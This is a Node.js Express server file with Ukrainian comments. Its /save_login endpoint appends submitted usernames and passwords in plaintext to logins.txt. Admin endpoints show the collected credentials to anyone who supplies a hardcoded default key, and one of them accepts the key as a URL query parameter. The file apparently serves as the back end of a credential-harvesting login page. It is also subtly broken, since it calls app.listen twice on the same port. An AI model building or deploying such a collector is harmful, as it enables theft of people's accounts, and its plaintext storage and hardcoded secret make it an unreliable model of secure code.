// server.js
const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();

const PORT = process.env.PORT || 3000;
const ADMIN_KEY = process.env.ADMIN_KEY || 'show81212';

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(__dirname));

// Головна сторінка
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Збереження логінів у файл
app.post('/save_login', (req, res) => {
  const { username, password } = req.body;
  if (!username || !password) {
    return res.status(400).send('Немає даних для збереження.');
  }
  const line = `${new Date().toISOString()} - ${username} : ${password}\n`;
  fs.appendFile(path.join(__dirname, 'logins.txt'), line, err => {
    if (err) {
      console.error('Write error:', err);
      return res.status(500).send('Помилка при збереженні.');
    }
    res.send('Дані збережено на сервері!');
  });
});

// Адмін форма
app.get('/admin', (req, res) => {
  const html = `<!doctype html>
  <html><head><meta charset="utf-8"><title>Admin</title></head><body style="font-family:Arial,sans-serif;padding:20px;">
  <h2>Admin — показати логіни</h2>
  <form method="POST" action="/view_logins">
    <label>Секрет: <input name="key" type="password" autofocus></label>
    <button type="submit">Показати логіни</button>
  </form>
  </body></html>`;
  res.type('html').send(html);
});

// Показати логіни (POST)
app.post('/view_logins', (req, res) => {
  const key = (req.body.key || '').toString();
  if (!key || key !== ADMIN_KEY) {
    setTimeout(() => res.status(403).send('Access denied'), 400);
    return;
  }
  const filePath = path.join(__dirname, 'logins.txt');
  fs.readFile(filePath, 'utf8', (err, data) => {
    if (err) {
      if (err.code === 'ENOENT') return res.type('text/plain').send('Файл logins.txt не знайдено.');
      console.error(err);
      return res.status(500).send('Помилка при читанні файлу.');
    }
    res.type('text/plain').send(data);
  });
});

// OPTIONAL: GET variant with query param ?key=...
app.get('/view_logins', (req, res) => {
  const key = (req.query.key || '').toString();
  if (!key || key !== ADMIN_KEY) return res.status(403).send('Access denied');
  const filePath = path.join(__dirname, 'logins.txt');
  fs.readFile(filePath, 'utf8', (err, data) => {
    if (err) {
      if (err.code === 'ENOENT') return res.type('text/plain').send('Файл logins.txt не знайдено.');
      console.error(err);
      return res.status(500).send('Помилка при читанні файлу.');
    }
    res.type('text/plain').send(data);
  });
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});


app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});

